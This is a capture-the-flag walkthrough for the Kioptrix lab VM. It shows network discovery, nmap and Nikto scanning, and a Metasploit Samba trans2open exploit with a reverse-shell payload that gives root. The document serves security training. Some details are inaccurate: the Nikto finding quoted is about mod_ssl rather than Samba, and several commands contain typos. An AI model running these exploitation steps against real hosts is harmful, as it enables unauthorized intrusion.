Kioptrix is a boot to root challenge, the goal is to gain root access using vulnerability assessment and exploitation tools and techniques.

![Kioptrix1](https://user-images.githubusercontent.com/104534892/236891421-44073633-88ad-4558-89e5-fdcae109936a.png)

Approach:
1. Network discovery
2. Enumeration
3. Exploitation
4. Find the flag

# 1. Network Discovery

First we need to get the IP address of the victim, so let's run a scan via netdiscover:

>What is netdiscover? is a scouting tool for wireless networks used to passively discover hosts or actively search for them using Address Resolution Protocol (ARP) requests.

The command to run the scan is: `sudo netdiscover`

![Kioptrix4](https://user-images.githubusercontent.com/104534892/236891485-df50e551-af9d-4d3c-bfaf-a2cf2bea4115.png)

Netdiscover returns us the name of the victim host "PCS Sysemtechnik", its IP address (in this case 10.0.2.4) and MAC address.

# 2. Enumeration

Once the IP address is obtained, we can use Nmap to check the host's services, protocols and open ports.

>What is Nmap? Acronym for Network Mapper is an open source tool for network security detection and control, it uses raw IP packets to determine which hosts are available on the network, which services (name and version), which operating systems (and version) and what kind of firewalls are in use and much more.

We run a scan using the command: `sudo nmap 10.0.2.4 -sV -p- -T4 -O`
- -sV to identify the running services and their version
- -p- scans all ports
- -T4 is for more aggressive and faster scanning
- -0 to identify the operating system

![Kioptrix5](https://user-images.githubusercontent.com/104534892/236891538-36720eab-9ea2-4828-9585-8b350f5c0cbe.png)

The scan shows port 80/tcp running Apache open: checking the website to check for any exploitable third-party web apps this leads us only to a test page that does not provide us with any additional information, not even the source code turns out to be useful.

![Kioptrix6](https://user-images.githubusercontent.com/104534892/236891571-a4e8d6df-fbfe-46c7-813f-7ff3c528572d.png)

From the previous scan carried out with nmap it can be seen that port 139/tcp runs a netBIOS Samba smbd, that is a client-server protocol for accessing files and directories; We look for vulnerabilities in the version in use via Nikto:
`nikto -h http://10.0.2.4`

![Kioptrix7](https://user-images.githubusercontent.com/104534892/236891608-df43baa8-b967-41b1-b765-1cd21f94c167.png)

From the result of the scan we can see that the version in use of Samba (2.2.1a) is vulnerable to a remote buffer overflow that allows us to access the shell remotely and compromise the victim VM:
`mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE- 2002-0082), OSVDB-756.`
found the vulnerability it is necessary to look for an exploit, after some searches I discovered that the Metasploit module to load is /exploit/linux/samba/trans2open (source: https://www.exploit-db.com/exploits/16861).

# 3. Exploitation

We use Metasploit to search for the exploit and gain access

>What is Metasploit? is an open source framework for developing, testing and running exploit code
	
![Kioptrix8](https://user-images.githubusercontent.com/104534892/236891639-369449f1-af7b-4b35-a700-6ffe187bbcf7.png)
- `sudo msfdb init`
- `msfconsole`
start the database as user "msf" and the console, then look for the vulnerability or trans2open: `search trans2open`

![Kioptrix9](https://user-images.githubusercontent.com/104534892/236891707-887aae6f-a647-42f0-807d-cb177a23749d.png)

we select the previously found exploit module `use exploit/linux/samba/tran2open` and display the details of the payload to be set via `options`:

![Kioptrix10](https://user-images.githubusercontent.com/104534892/236891738-acc3c456-eecd-42db-afa3-588eecbbe61a.png)

We then set:
- the remote host (RHOST) `set RHOST10.0.2.4`
- the `set payload linux/x86/shell_reverse_tcp` payload
and run the `exploit` exploit and generate the shell:

![Kioptrix12](https://user-images.githubusercontent.com/104534892/236891766-de3d8c41-ff09-4cb3-b77a-65624ea127a6.png)

Once we have accessed the victim VM, check the privileges:

![Kioptrix13](https://user-images.githubusercontent.com/104534892/236891783-208d9439-2dc3-4b16-a1a7-b0a3bc944d0a.png)

We have gained root access to the machine, now just generate a TTY shell via `/bin/bash -i` to use the bash shell.

# 4. Find the flag

Before looking for the flag let's look at the history of commands used in the shell via `history`:

![Kioptrix14](https://user-images.githubusercontent.com/104534892/236891812-5a528c9b-87df-452c-83a2-5cf906aff2d9.png)

we note that the mail command has been used, so we access the directory as the root user to read the saved mails:

![Kioptrix15](https://user-images.githubusercontent.com/104534892/236891829-19387e6f-80b0-4ac9-9a32-8854a67c53c0.png)

VM completed, we got the flag!
